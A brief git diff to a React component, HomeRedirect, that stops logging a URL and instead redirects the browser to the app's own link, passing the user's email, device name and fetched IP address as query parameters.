@@ -42,8 +42,8 @@ function HomeRedirect() {
 
       getIP().then((res) => {
         const ip=res.data.IPv4
-        console.log(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
-       // window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
+        console.log(ip);
+        window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
       // window.location.assign(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
       });
 
